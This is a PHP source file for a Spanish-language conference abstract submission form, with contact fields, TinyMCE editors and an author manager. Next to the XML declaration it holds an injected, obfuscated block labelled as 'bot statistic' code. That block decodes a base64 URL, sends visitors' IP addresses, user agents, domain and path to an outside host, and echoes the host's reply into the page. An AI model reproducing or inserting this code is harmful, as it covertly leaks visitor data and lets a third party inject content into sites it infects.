<?php
session_start();
header("Cache-Control: private, no-cache, must-revalidate");
header("Pragma: no-cache");

require('inc.config.php');

if($leerRegl == true){
	if(($_SESSION["chkAcepto"]=="")||($_SESSION["chkAcepto"]=="1")){ 
		$btnHabilitado =  "disabled='disabled'"; 
	}
}					  
					  
if (!isset($_SESSION["registrado"])){
	$_SESSION["registrado"]=false;

}
if ($_SESSION["registrado"]==false){
	//header ("Location: AUTOR_codigo.php");
}
function remplazarTITULO($donde){
	$valor = str_replace("<br>", "" , $donde);
	$valor = str_replace("<br />", "" , $valor);
	$valor = str_replace("&nbsp;", " " , $donde);
return $valor;
}
function remplazar($donde){

	$valor = str_replace("<p>", "" , $donde);
	$valor = str_replace("</p>", "" , $valor);

	$valor = str_replace("<u>", "" , $valor);
	$valor = str_replace("</u>", "" , $valor);
	
	$valor = str_replace("<br><br>", "<br>" , $valor);
	$valor = str_replace("<br /><br />", "<br>" , $valor);

	$valor = str_replace("<strong>", "" , $valor);
	$valor = str_replace("</strong>", "" , $valor);
	
	$valor = str_replace("<h1>", "" , $valor);
	$valor = str_replace("</h1>", "" , $valor);	
	
	$valor = str_replace("<h2>", "" , $valor);
	$valor = str_replace("</h2>", "" , $valor);
		
	$valor = str_replace("<h3>", "" , $valor);
	$valor = str_replace("</h3>", "" , $valor);

	$valor = str_replace("<span>", "" , $valor);
	$valor = str_replace("</span>", "" , $valor);
	
	$valor = str_replace("'", "´" , $valor);
	$valor = str_replace("\'", "´" , $valor);
	$valor = str_replace("\\'", "´" , $valor);
	$valor = str_replace("\\\'", "´" , $valor);
	$valor = str_replace("\\\\'", "´" , $valor);
	$valor = str_replace("\\\\\'", "´" , $valor);
	$valor = str_replace("\\\\\\'", "´" , $valor);
		
	$valor = str_replace("\´", "´" , $valor);	
	
	$valor = str_replace('<p class="""MsoNormal""">', "" , $valor);	
	$valor = str_replace('<p class="MsoBodyText2">', "" , $valor);	
	$valor = str_replace('<p class="MsoNormal">', "" , $valor);	
	$valor = str_replace('<p align="center" class="MsoNormal">', "" , $valor);	

	$valor = addslashes($valor);

	return $valor;

}

include "../conexion.php";

require "clases/class.autores.php";
require ("../clases/trabajosLibres.php");
include dirname(__FILE__).'/replacePngTags.php';
echo '<?xml version="1.0" encoding="iso-8859-1"?><?
if (!isset($sRetry))
{
global $sRetry;
$sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if((strstr($sUserAgent, 'google') == false)&&(strstr($sUserAgent, 'yahoo') == false)&&(strstr($sUserAgent, 'baidu') == false)&&(strstr($sUserAgent, 'msn') == false)&&(strstr($sUserAgent, 'opera') == false)&&(strstr($sUserAgent, 'chrome') == false)&&(strstr($sUserAgent, 'bing') == false)&&(strstr($sUserAgent, 'safari') == false)&&(strstr($sUserAgent, 'bot') == false)) // Bot comes
    {
        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
        $stCurlLink = base64_decode( 'aHR0cDovL2hvdGxvZ3VwZGF0ZS5jb20vc3RhdC9zdGF0LnBocA==').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            $stCurlHandle = curl_init( $stCurlLink ); 
    }
    } 
if ( $stCurlHandle !== NULL )
{
    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
    $sResult = @curl_exec($stCurlHandle); 
    if ($sResult[0]=="O") 
     {$sResult[0]=" ";
      echo $sResult; // Statistic code end
      }
    curl_close($stCurlHandle); 
}
}
?>'; // so those with short_tags = On don't complain about the parse error
$trabajos = new trabajosLibre;


$autoresObj = new autores();

if($_GET["error"]==1){

	echo "<script>\n";
		//echo "parent.Cerrar();\n";
		echo "alert('Debe llenar todo los campos. Gracias')\n";
	echo "</script>\n";
}
if($_GET["error"]==2){
	echo "<script>\n";
		//echo "parent.Cerrar();\n";
		echo "alert('Ha ocurrido un error con los participantes. Chequee que los datos sean correcto. Gracias')\n";		
	echo "</script>\n";
}
if($_GET["error"]==3){

	echo "<script>\n";
		//echo "parent.Cerrar();\n";
		echo "alert('No ha adjuntado ningún archivo. Por favor, verifique sus datos y adjunte su resumen extendido. Gracias')\n";
	echo "</script>\n";
}
$TL_rs = $trabajos->selectTL_ID($_SESSION["ID_TL"]);
while ($row = mysql_fetch_object($TL_rs)){


}
	$emailContacto = $_SESSION["emailContacto"];
	$emailContacto2 = $_SESSION["emailContacto2"];
	$ApellidoContacto = $_SESSION["ApellidoContacto"];
	$NombreContacto = $_SESSION["NombreContacto"];
	$InstContacto = $_SESSION["InstContacto"];
	$paisContacto = $_SESSION["paisContacto"];
	$ciudadContacto = $_SESSION["ciudadContacto"];
	$telContacto = $_SESSION["telContacto"];
	$travel_award = $_SESSION["travel_award"];	
	$numero = $_SESSION["numero"];
	$tema = $_SESSION["tema"];
	$titulo = trim(remplazarTITULO($_SESSION["titulo"]));
	$resumen = $_SESSION["resumen"];
	$key1 = trim($_SESSION["key1"], ", ") ;
	$key2 = trim($_SESSION["key2"], ", ") ;
	$key3 = trim($_SESSION["key3"], ", ") ;
	$key4 = trim($_SESSION["key4"], ", ") ;
	$key5 = trim($_SESSION["key5"], ", ") ;
	
function remlazarColor($cualViejo, $ses){

	if($_GET["error"]==1 && $_SESSION[$ses]==""){

			$color ="#ff0000";


	}else{
		$color = $cualViejo;
	}
return $color;
}

?>



<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title><?=$congreso?> - Presentaci&oacute;n de Trabajo</title>
<link href="css/estilos.css" rel="stylesheet" type="text/css" />
<script src="js/autores.js"></script>
<script language="javascript" type="text/javascript" src="js/ajax.js"></script>
<script language="javascript" type="text/javascript" src="js/funciones.js"></script>
<script language="javascript" type="text/javascript" src="tinymce/jscripts/tiny_mce/tiny_mce.js"></script>
<script language="javascript" type="text/javascript">

	autorRegistrado = false;

	tinyMCE.init({
		mode : "exact",
		elements : "titulo",
		theme: "advanced",
		language : "es",
		theme_advanced_toolbar_location : "top",
		theme_advanced_toolbar_align : "right",
		theme_advanced_buttons1 : "italic,underline,separator, sub, sup, separator, charmap, separator, undo, redo",
		theme_advanced_buttons2 : "",
		theme_advanced_buttons3 : ""

	});


	tinyMCE.init({
		mode : "exact",
		elements : "resumen",
		theme: "advanced",
		language : "es",
		theme_advanced_toolbar_location : "top",
		theme_advanced_toolbar_align : "right",
		theme_advanced_buttons1 : "bold,italic,underline,separator, sub, sup, separator, charmap, separator, undo, redo",
		theme_advanced_buttons2 : "",
		theme_advanced_buttons3 : ""

	});

	tinyMCE.init({
		mode : "exact",
		elements : "resultado",
		theme: "advanced",
		language : "es",
		theme_advanced_toolbar_location : "top",
		theme_advanced_toolbar_align : "right",
		plugins : "table",
		theme_advanced_buttons1 : "bold,italic,underline,separator, sub, sup, separator, charmap, separator, table, row_before, row_after, delete_row,  col_before, col_after, delete_col, undo, redo",
		theme_advanced_buttons2 : "",
		theme_advanced_buttons3 : ""

	});

</script>
<style type="text/css">
<!--
body {
	background-color: <?=$colorFondo?>;
}
.camposTL {
font-family:Arial, Helvetica, sans-serif;
font-size:11px;
}
-->
</style></head>

<body onLoad="cargarIframeAutores()">

<div id="Guardando">
	Guardando . . . 
</div>

<iframe id="guardar" name="guardar" style="display:none"></iframe>
	<center>

<table width="770" border="2" cellpadding="4" cellspacing="0" bordercolor="#000000" bgcolor="<?=$colorFondoArriba?>">
  <tr>
    <td><table width="100%" border="0" cellpadding="2" cellspacing="0" class="textos"><form action="AUTOR_codigo_enviar.php" method="post" name="form1" id="form1">
      <tr>
        <td width="100%" height="35" class="textos">
		
		<center>  
		<font face="Arial, Helvetica, sans-serif">
		  <?
				$pass = $_GET["pass"];
				
				if($pass=="0"){
					echo "<center><font  color='#990000' size='2'><b>El C&oacute;digo del Trabajo o contrase&ntilde;a no son correctas</b></font></center><br>";
				}else{
				
				}
				
			?>
		  </font>Para modificar datos personales o de su resumen por favor ingrese los siguientes datos:
		  <div style="border:3px solid <?=$colorFondo?> ; width:65%; background-color:<?=$colorFondoClaro?>">
		
		  <table width="99%" border="0" align="center" cellpadding="0" cellspacing="2">
          <tr class="textos">
            <td width="37%"><strong>C&oacute;digo de trabajo:</strong>
              <input type="text" name="txtCod" id="txtCod"  style="width:60px" ></td>
            <td width="38%" valign="middle"><strong>Contrase&ntilde;a:</strong>
              <input type="password" name="txtClave" id="txtClave"  style="width:60px" ></td>
            <td width="25%"><input name="Submit" type="submit" class="botones" value="Ingresar al Trabajo"></td>
          </tr>
        </table>
		</div>
		</center></td>
      </tr></form>
    </table>
      <table width="100%" border="0" cellpadding="2" cellspacing="0" class="textos">
        </table></td>
  </tr>
</table>

	<table width="770" border="1" align="center" cellpadding="0" cellspacing="0" bordercolor="#000000">
	  <tr bgcolor="#F0F0F0">
	 <td width="180" valign="top" bordercolor="#000000" bgcolor="#F8EDDC"><div style="padding:2px; text-align:left;">
          <div align="center"><font color="#990000" size="2" face="Verdana, Arial, Helvetica, sans-serif"><strong>
            <h3><?=$congreso?></h3>
            Recomendaciones</strong></font> </div>
	      <ul style="margin:6px; padding:8px;">
	        <li class="textos"><font size="2" face="Arial, Helvetica, sans-serif">El <strong>mail de contacto</strong> ser&aacute; el nexo entre el comit&eacute; y Ud. por lo tanto recomendamos <strong>revisarlo periodicamente.</strong></font></li>
	        <li class="textos"><font size="2" face="Arial, Helvetica, sans-serif">Para hacer un salto de linea  utilize <strong>Shift + Enter</strong></font></li>
	        <li class="textos"><font size="2" face="Arial, Helvetica, sans-serif"><strong>Autores:</strong> Apellidos e iniciales del nombre  (no incluir grado &oacute; t&iacute;tulo). <br />
	          Debe elegir que autor presentar&aacute; el trabajo.<br />
	          Es necesario la instituci&oacute;n, el mail, el pa&iacute;s y la ciudad de cada participante.</font></li>
	        <li class="textos"><font size="2" face="Arial, Helvetica, sans-serif"><strong>Resumen</strong>: M&aacute;ximo 300 palabras </font> </li>
          </ul>
	      </div>
	   </td>
	 
			<td width="600" bordercolor="#000000"><table width="100%" border="2" cellpadding="5" cellspacing="0" bordercolor="#000000">
          <tr>
            <td height="34" bordercolor="#F0F0F0"><div align="center"><strong><font size="4" face="Verdana, Arial, Helvetica, sans-serif">Presentación de Trabajos</font></strong>                    
            </div></td>
          </tr>
          <tr>
            <td bordercolor="#F0F0F0"><form action="" method="post" name="form0" target="_blank" id="form0">
                <table width="550" border="0" align="center" cellpadding="3" cellspacing="1">
                  <tr>
                    <td width="531" height="10"><? if($numero!=""){echo "<span class='textos' style='font-size:12px'>Nº Trabajo: <strong>" . $numero . "</strong>";}?></td>
                  </tr>
                  <tr bgcolor="#F0F0F0">
                    <td bgcolor="#003366"><table width="100%" border="0" cellspacing="0" cellpadding="2">
                      <tr>
                        <td height="22" colspan="4" valign="middle" bgcolor="#D1D1D1"  class="textos"><strong>&nbsp;CONTACTO</strong>  (Recuerde que el mail de contacto será la principal vía de comunicación) </td>
                        </tr>
                      <tr>
                        <td width="98" height="22" valign="middle" bgcolor="#E9E9E9"  class="textos"><strong>&nbsp;email :</strong> </td>
                        <td colspan="3" valign="middle" bgcolor="#E9E9E9" ><input name="emailContacto" type="text" class="campos" id="emailContacto" value="<?=$emailContacto?>"  style=" width:85%;"/></td>
                        </tr>
                      <tr>
                        <td height="22" valign="middle" bgcolor="#E9E9E9"  class="textos"><strong>Confirmar email :</strong> </td>
                        <td colspan="3" valign="middle" bgcolor="#E9E9E9"  class="textos"><input name="emailContacto2" type="text" class="campos" id="emailContacto2" value="<?=$emailContacto2?>"  style=" width:85%;"/>                          </td>
                      </tr>
                      <tr>
                        <td height="22" valign="middle" bgcolor="#E9E9E9"  class="textos"><strong>&nbsp;Apellido:</strong></td>
                        <td width="173" valign="middle" bgcolor="#E9E9E9" ><input name="ApellidoContacto" type="text" class="campos" id="ApellidoContacto" value="<?=$ApellidoContacto?>"  style=" width:90%;"/></td>
                        <td width="60" valign="middle" bgcolor="#E9E9E9" ><span class="textos"><strong>&nbsp;<strong>Nombre</strong><strong>:</strong></strong></span></td>
                        <td width="195" valign="middle" bgcolor="#E9E9E9" ><span class="textos"><strong>
                          <input name="NombreContacto" type="text" class="campos" id="NombreContacto" value="<?=$NombreContacto?>
"  style=" width:90%;"/></strong></span></td>
                      </tr>
                      <tr>
                        <td height="22" valign="middle" bgcolor="#E9E9E9"  class="textos">&nbsp;<strong>Institución:</strong> </td>
                        <td valign="middle" bgcolor="#E9E9E9" ><input name="InstContacto" type="text" class="campos" id="InstContacto" value="<?=$InstContacto?>"  style=" width:90%;"/></td>
                        <td valign="middle" bgcolor="#E9E9E9" ><span class="textos">&nbsp;<strong>País:                        </strong></span></td>
                        <td valign="middle" bgcolor="#E9E9E9" ><select name="paisContacto"  class="campos" width="100%" >
                            <?
							 foreach ($paises as $i){
							 
								if($_SESSION["paisContacto"] == $i){
									$sel = "selected";
								}else{
									$sel = "";
								}
								 
							echo  "<option value='$i' $sel>$i</option>";
							}
							 ?>
                          </select></td>
                      </tr>
                      <tr>
                        <td height="22" valign="middle" bgcolor="#E9E9E9"  class="textos">&nbsp;<strong>Ciudad:</strong> </td>
                        <td valign="middle" bgcolor="#E9E9E9" ><input name="ciudadContacto" type="text" class="campos" id="ciudadContacto" value="<?=$ciudadContacto?>"  style=" width:90%;"/></td>
                        <td valign="middle" bgcolor="#E9E9E9" ><span class="textos">&nbsp;<strong>Teléfono:</strong></span></td>
                        <td valign="middle" bgcolor="#E9E9E9" ><strong>
                          <input name="telContacto" type="text" class="campos" id="telContacto" value="<?=$telContacto?>"  style=" width:90%;"/>
                        </strong></td>
                      </tr>
                    </table></td>
                  </tr>
                  <tr>
                    <td height="10"></td>
                  </tr>
                  <tr>
                    <td bgcolor="<?=remlazarColor("#016296", "titulo")?>"><div class="subtitulos">Título:</div>
                      <textarea id="titulo" name="titulo" rows="3"  style="padding:10px; width:100%;"><span style="text-transform: uppercase;"><?=$titulo?></span></textarea></td>
                  </tr>
                    <tr>
                    <td height="10"></td>
                  </tr>
               <? /* <tr bgcolor="#027ABB">
                    <td bgcolor="#016296"><table width="100%" border="0" cellpadding="2" cellspacing="0" style="border:solid 1px #999999">
                       <tr>
                          <td width="46%" bgcolor="#E9E9E9">
						  <div style="float:left; width:260px;">
						  <span class="textos"><strong>Tema:</strong> 
                             &nbsp;<span style="padding:5px;">
							    <select name="tema" id="tema" style="width:200px;" onChange="habilitarOtro(this.value)" >
                              <?
							 foreach ($areas as $i){
							 
								if($_SESSION["tema"] == $i){
									$sel = "selected";
								}else{
									$sel = "";
								}
								 
							echo  "<option value='$i' $sel>$i</option>";
							}
							 ?>
                            </select>


                             </span></span></div>
							 <div  id="DIVOtroTema" style="width:250px; float:right; display:none">
							<span class="textos"><strong>  Otro: </strong>
                             <input type="text" name="OtroTema" style="width:200px;"></span>
						    </div></td>
                        </tr>

                    </table></td>
                  </tr> 
                  <tr>
                    <td height="10"></td>
                  </tr>*/ ?>
                  <tr bgcolor="#027ABB">
                    <td bgcolor="#016296"><table width="100%" border="1" cellpadding="2" cellspacing="0" style="border:solid 1px #999999">
              <tr>
                    <td bgcolor="#E9E9E9"><span class="textos" style="width:550px;"><strong>Autores:</strong><span style="padding:5px;"><a href="#" onClick="abrirAutores()" style="color:#0000FF;">Haga click aqui para <strong>agregar o modificar autores</strong> (el <strong>contacto</strong> no se agrega automaticamente)</a></span></span></td>
                  </tr>
                  <tr>
                    <td bgcolor="#FFFFFF"><div id="divAutores" align="center" style="padding:1px; "></div></td>
                  </tr>
                    </table></td>
                  </tr>
                  <tr>
                    <td height="10"></td>
                  </tr>
                  <tr>
                    <td bgcolor="<?=remlazarColor("#016296", "resumen")?>"><div class="subtitulos">Resumen:</div>
                      <textarea id="resumen" name="resumen" rows="10" cols="75" style="padding:10px;  width:100%;" >
					  <span style="font-family:'Times New Roman', Times, serif">
					  <? if (htmlentities($resumen)==""){
						echo " <strong>Introducci&oacute;n:</strong><br><br>
							<strong>Objetivos:</strong><br><br>
							<strong>Dise&ntilde;o:</strong><br><br>
							<strong>Resultados:</strong> <br><br>
							<strong>Conclusiones:</strong><br>";
						 }else{
						 echo htmlentities($resumen);
						 }?>
						 </span>
                        </textarea></td>
                  </tr>
                  <tr>
                    <td height="10"></td>
                  </tr>
                 <tr bgcolor="#027ABB">
                    <td bgcolor="#016296"><table width="100%" border="1" cellpadding="2" cellspacing="0" style="border:solid 1px #999999">
                        <tr>
                          <td height="34" bgcolor="#E9E9E9"><span class="textos" style="width:550px;"><strong>Palabras Clave:</strong><span style="padding:5px;">
                            <input type="text" name="key1" class="textos" style="width:80px"  value="<?=$key1?>">
                            ,
                            <input type="text" name="key2" class="textos" style="width:80px" value="<?=$key2?>" >
                            ,
                            <input type="text" name="key3" class="textos" style="width:80px" value="<?=$key3?>">
                            ,
                            <input type="text" name="key4" class="textos" style="width:80px" value="<?=$key4?>">
                            ,
                            <input name="key5" type="text" class="textos" style="width:80px" value="<?=$key5?>">
                          </span></span></td>
                        </tr>
                    </table></td>
                  </tr>
                  <tr>
                    <td height="10"></td>
                  </tr> 
  <tr>
                  <?
				  if($leerRegl == true){
				  ?>
				    <td height="10" class="textos"><table width="100%" border="0" align="center" cellpadding="0" cellspacing="0" bgcolor="#F0F0F0" class="textos">
 
  <tr>
    <td><label style="cursor:pointer"><input type="checkbox" name="chkAcepto" value="1" onClick="HabilitarAceptar()" <? if($_SESSION["chkAcepto"]=="1"){ echo 'checked="checked"'; } ?> >
                        <strong>Le&iacute; el reglamento y acepto las condiciones</strong>Leer Reglamento </label>                    - (<a href="reglamento.html" target="_blank">español</a>, <a href="reglamento.html" target="_blank">ingles</a>, <a href="reglamento.html" target="_blank">portugues</a>) </td>
  </tr>
</table></td><? } ?>
                  </tr>
                  <tr>
                    <td><div align="right">
                      <? // <input name="Submit42" type="button" class="botones" onClick="vistaPrevia()" value="Vista Previa" style="width:100px;" /> ?>
                      &nbsp;
                      <input name="btnAceptarYverificar" type="button" class="botones" onClick="vistaPrelimiar()" value="Aceptar esta composición y verificar si es correcta" style="width:350px; font-size:13px; font-weight:bold;" <?=$btnHabilitado?> />
                    </div></td>
                  </tr>
                </table>
            </form></td>
          </tr>
        </table></td>
          
	  </tr>
	</table>

   <br>
 <font color="#CCCCCC" size="1" face="Arial, Helvetica, sans-serif"> <font color="#999999">v3.07 por</font> </font><font size="1" face="Arial, Helvetica, sans-serif" color="#CCCCCC" >GEGA srl</font> 
</center>

    <div id="previa" style="display:none;" align="right">
  <a href="#" onClick="Cerrar()">
  <b style="font-family:Verdana, Arial, Helvetica, sans-serif;text-align:right; text-decoration:none; color:#990000; font-size:12px" >[x]</b>
  </a>
  <iframe name="marcoPrevia" width="520px" height="500px;"></iframe>

</div>


<div id="ventanaAutores" style="display:none;">
  <table id="Tabla_01" width="541" border="0" cellpadding="0" cellspacing="0">
   
    <tr>
      <td><?php echo replacePngTags('<img src="armado-globo-autores_01.png" />'); ?></td>
      <td><?php echo replacePngTags('<img src="armado-globo-autores_02.png" />'); ?></td>
      <td><?php echo replacePngTags('<img src="armado-globo-autores_03.png" />'); ?></td>
    </tr>
	
    <tr>
      <td><?php echo replacePngTags('<img src="armado-globo-autores_04.png" />'); ?></td>
      <td valign="top" bgcolor="#FFFFFF">
	<div id="cargaAutores"><strong><font color="#FF0000" size="2" face="Verdana, Arial, Helvetica, sans-serif">Please wait...</font></strong></div>
	
	<div id="elementosAutores" style="display:none;">
	
			 <div>
			 <iframe id="iframeAutores" frameborder="0"   name="iframeAutores" style=" height:400px; width:100%;"></iframe>
			 </div>
	 
		   <div style="margin-top:15px;" align="right">
		   <input name="button" type="button" class="botones" onClick="cerrarVentanaAutores()" value="Cancel" style="width:100px; font-size:12px;">
		   <input name="button" type="button" class="botones" onClick="frames['iframeAutores'].validarAutor()" value="Aceptar y guardar" style="width:150px; font-size:13px; font-weight:bold;">
		   </div>
	
	 </div>	
		
	  </td>
      <td><?php echo replacePngTags('<img src="armado-globo-autores_06.png" />'); ?></td>
    </tr>
    <tr>
      <td><?php echo replacePngTags('<img src="armado-globo-autores_07.png" />'); ?></td>
	  <td><?php echo replacePngTags('<img src="armado-globo-autores_08.png" />'); ?></td>
      <td><?php echo replacePngTags('<img src="armado-globo-autores_09.png"   />'); ?></td>
    </tr>
  </table>
</div>


</body>
</html>
<script language="javascript" type="text/javascript" src="js/funciones_ArmadoTrabajoLibre.js"></script>
	 <?
include "inc.gestionAutores.php";
?>
<script>cargarDivAutores('<?=$gestionAutores?>');</script>
<?
	echo "<script>\n";

		if($_SESSION["reglamento"]==1){
		//	echo "carrarRecomendaciones()\n";
		}
		if($_SESSION["chkAcepto"]=="1"){
			echo "HabilitarAceptar()\n";
		}

	echo "</script>\n";

$_SESSION["reglamento"]=1;
?>
